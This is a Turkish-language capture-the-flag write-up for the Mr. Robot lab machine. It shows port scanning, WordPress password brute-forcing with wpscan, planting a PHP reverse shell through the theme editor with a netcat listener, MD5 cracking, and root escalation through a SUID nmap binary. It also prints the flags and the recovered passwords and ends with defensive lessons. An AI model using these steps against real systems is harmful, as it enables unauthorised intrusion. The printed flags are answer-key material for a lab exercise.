# Mr. Robot CTF Writeup — Root'a Giden Yol

## 🎯 Hedef Bilgisi

- **Hedef IP:** `10.112.169.2`
- **İşletim Sistemi:** Linux
- **Servisler:** HTTP/HTTPS (WordPress)

---

## 1️⃣ Recon (Keşif) — Nmap Taraması

İlk adım her zaman olduğu gibi VPN bağlantısını kurup hedefe kapsamlı bir Nmap taraması atmak:

```bash
nmap -sS -sC -sV -p- 10.112.169.2
```
**Parametrelerin anlamı:**
- `-sS` → SYN (stealth) tarama
- `-sC` → varsayılan NSE scriptlerini çalıştır
- `-sV` → servis/versiyon tespiti
- `-p-` → tüm 65535 portu tara

Tarama sonucunda hedefte **web servisi (80/443)** açık olduğunu doğruladım. Sonuçlar bir WordPress kurulumuna işaret ediyordu.

<img width="798" height="412" alt="nmap" src="https://github.com/user-attachments/assets/e95defc5-9164-450c-afea-98fb076d3b70" />

---

## 2️⃣ Web Enumeration — Dizin Taraması

Web sayfasına manuel olarak göz attığımda dikkat çekici bir şey bulamadım. Bu noktada klasik bir dizin/dosya fuzzing adımına geçtim:

```bash
ffuf -u http://10.112.169.2/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

Sonuçlar arasında `robots.txt` dosyası dikkatimi çekti — genellikle arama motorlarının taramaması istenen, ama pentester için altın değerinde olan bir dosya.

<img width="888" height="761" alt="ffuf" src="https://github.com/user-attachments/assets/64f557ae-a896-4891-891a-b7bef2b934a2" />


### `robots.txt` İçeriği

```
https://10.112.169.2/robots.txt
```
<img width="565" height="159" alt="robots txt" src="https://github.com/user-attachments/assets/fa2688b7-502f-47b1-95b7-63de10ffdc04" />


Dosya içinde iki önemli referans buldum:

```
key-1-of-3.txt
fsocity.dic
```
### 🚩 Flag #1

```
https://10.112.169.2/key-1-of-3.txt
```

```
073403c8a58a1f80d943455fb30724b9
```

### Wordlist'i İndirme

`fsocity.dic`, WordPress giriş denemeleri için kullanılabilecek özel bir wordlist dosyasıydı. İndirdim:

```bash
wget --no-check-certificate https://10.112.169.2/fsocity.dic
```

Dosya oldukça büyük ve içinde ciddi miktarda tekrar eden satır olduğunu fark ettim. Brute-force süresini kısaltmak için önce satır sayısını kontrol edip ardından benzersiz (unique) hale getirdim:

```bash
wc -l fsocity.dic
sort -u fsocity.dic > fsocity_unique.dic
wc -l fsocity_unique.dic
```

Bu adım, kaba kuvvet saldırısının süresini ciddi oranda azalttı — çünkü tekrar eden aynı parolaları defalarca denemenin bir anlamı yok.

---

## 3️⃣ WordPress Enumeration & Credential Brute-Force

Hedefte WordPress tespit ettiğim için `wpscan` ile detaylı tarama yaptım:

```bash
wpscan --url https://10.112.169.2 --disable-tls-checks
```

<img width="990" height="683" alt="wpscan" src="https://github.com/user-attachments/assets/65cef082-fe0e-4f27-9b0b-35cf964adcd6" />

### Kullanıcı Adı Arama

```bash
wpscan --url https://10.112.169.2 \
  --disable-tls-checks \
  --enumerate u
```

Standart enumeration ile bir kullanıcı adı elde edemedim. Ancak CTF'in *Mr. Robot* temasından yola çıkarak ana karakterin adı olan **`elliot`**'ın kullanıcı adı olabileceğini düşündüm ve bu varsayımla doğrudan brute-force saldırısına geçtim.

### Parola Brute-Force

```bash
wpscan --url https://10.112.169.2 \
  --disable-tls-checks \
  --usernames elliot \
  --passwords fsocity_unique.dic
```

Kısa bir süre sonra geçerli kimlik bilgileri elde ettim:

```
Username: elliot
Password: ER28-0652
```

## 4️⃣ Exploitation — WordPress Üzerinden Shell Alma

Elde edilen kimlik bilgileriyle admin paneline giriş yaptım:

```
https://10.112.169.2/wp-admin/index.php
```


WordPress admin panelinde **tema dosyası düzenleyicisi (Appearance → Theme Editor)** genellikle RCE (Remote Code Execution) için en klasik ve güvenilir yöntemlerden biridir. Çünkü tema editörü, PHP dosyalarını doğrudan sunucu üzerinde düzenleyip kaydetmenize izin verir.

### Adımlar

1. `Appearance > Editor` menüsüne gidip aktif temanın `404.php` dosyasını seçtim.
2. Dosya içeriğini bilinen bir **PHP reverse shell payload'u** (örn. pentestmonkey `php-reverse-shell.php`) ile değiştirdim.
3. Dinleyiciyi ayağa kaldırdım:

```bash
nc -lvnp 9001
```

4. Tarayıcıdan değiştirdiğim `404.php` sayfasını tetikledim (örn. var olmayan bir sayfaya istek atarak):

```
https://10.112.169.2/wp-content/themes/<tema-adi>/404.php
```
<img width="1048" height="623" alt="shell1" src="https://github.com/user-attachments/assets/070b5e59-190e-45dc-9e31-50eecb7dca4a" />

5. Netcat dinleyicisinde bağlantı düştü ve düşük yetkili bir shell elde ettim.

### TTY Upgrade (Shell İyileştirme)

İlk elde edilen shell çoğu zaman "dumb" bir shell'dir — tab completion, ctrl+c, geçmiş komutlar gibi özellikler çalışmaz. Bu yüzden PTY spawn ile tam bir bash shell'e yükselttim:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
```
---

## 5️⃣ Yatay Hareket — Kullanıcı Ele Geçirme (robot)

`/home` dizinine geçtiğimde beni şu dosyalar karşıladı:

```bash
cd /home
ls -la
```

```
key-2-of-3.txt
password.raw-md5
```

`key-2-of-3.txt` dosyasını okumaya çalıştığımda yetki hatası aldım — dosya `robot` kullanıcısına ait olduğu için önce o kullanıcıya geçmem gerekiyordu.

`password.raw-md5` dosyasının içeriği bir **MD5 hash** formatındaydı, bu da bana `robot` kullanıcısının parolasının hash'lenmiş hâli olduğunu gösterdi. Hash'i crackstation veya `hashcat`/`john` gibi araçlarla kırdım:

```bash
hashcat -m 0 password.raw-md5 fsocity_unique.dic
# veya
john --format=raw-md5 --wordlist=fsocity_unique.dic password.raw-md5
```

Elde edilen parola:

```
abcdefghijklmnopqrstuvwxyz
```

### Kullanıcı Geçişi

```bash
su robot
```

Parolayı girdikten sonra `robot` kullanıcısına geçiş yaptım ve ikinci flag'i okudum:

### 🚩 Flag #2

```bash
cat key-2-of-3.txt
```
---

<img width="691" height="283" alt="robot" src="https://github.com/user-attachments/assets/586f0377-c326-4871-a8d8-d393f6a4e984" />

## 6️⃣ Privilege Escalation — Root'a Yükselme

`robot` kullanıcısı olarak sistemde ayrıcalık yükseltme (privilege escalation) için klasik bir kontrol yaptım: **SUID bitine sahip dosyaları arama.**

```bash
find / -perm -4000 -type f 2>/dev/null
```

Çıktı içinde dikkatimi çeken satır şu oldu:

```
/usr/local/bin/nmap
```

Bu, sistem yöneticisinin `nmap` binary'sine SUID biti eklediği anlamına geliyordu. Eski Nmap sürümlerinde (`< 5.21`) bulunan `--interactive` modu, SUID ile birlikte kullanıldığında doğrudan root yetkisiyle komut çalıştırmaya izin veriyordu — bu bilinen bir [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/) tekniğidir.

### Exploit Adımları

```bash
nmap --interactive
```

Nmap interaktif konsoluna girdikten sonra:

```
nmap> !/bin/bash
```
<img width="672" height="558" alt="root1" src="https://github.com/user-attachments/assets/18504749-eb1f-48a6-9eb5-2f2ab8ac2480" />

Komut çalıştıktan sonra kullanıcı kontrolü yaptım:

```bash
whoami
# root
```

Artık root yetkisiyle tam bir shell elde etmiştim.

<img width="281" height="150" alt="lastflag" src="https://github.com/user-attachments/assets/66f57842-d47b-4bf7-b5bd-2951219ef497" />


### 🚩 Flag #3 (Root)

```bash
cat /root/key-3-of-3.txt
```

```
04787ddef27c3dee1ee161b21670b4e4
```

---

## 🔑 Toplanan Flag'ler

| Flag | Değer |
|---|---|
| Key 1 | `073403c8a58a1f80d943455fb30724b9` |
| Key 2 | *(okundu, `/home/robot/key-2-of-3.txt`)* |
| Key 3 (Root) | `04787ddef27c3dee1ee161b21670b4e4` |

---

## 🛡️ Alınan Dersler

Bu makine, gerçek dünyada sıkça karşılaşılan birkaç kritik güvenlik zafiyetini bir araya getiriyor:

1. **Hassas dosyaların açıkta bırakılması:** `robots.txt` ve wordlist dosyası gibi bilgiler saldırganlara doğrudan yol gösterdi.
   - *Öneri:* Hassas veya iç kullanım için hazırlanmış dosyalar asla web kök dizininde bırakılmamalı.

2. **Zayıf/tahmin edilebilir parolalar:** `ER28-0652` gibi bir parola, wordlist saldırısına karşı savunmasız kaldı.
   - *Öneri:* Güçlü parola politikaları ve MFA (çok faktörlü kimlik doğrulama) zorunlu kılınmalı.

3. **WordPress Tema Editörü'nün açık bırakılması:** Admin panelinden doğrudan PHP dosyası düzenlenebilmesi, RCE'ye doğrudan kapı açtı.
   - *Öneri:* `DISALLOW_FILE_EDIT` sabiti `wp-config.php` içinde `true` olarak ayarlanmalı, dosya düzenleme yetkisi tamamen kapatılmalı.

4. **Yanlış yapılandırılmış SUID izinleri:** `nmap` gibi bir aracın SUID biti taşıması, kritik bir privilege escalation vektörü oluşturdu.
   - *Öneri:* SUID biti yalnızca kesinlikle gerekli olan binary'lere verilmeli; düzenli olarak `find / -perm -4000` denetimi yapılmalı.

---
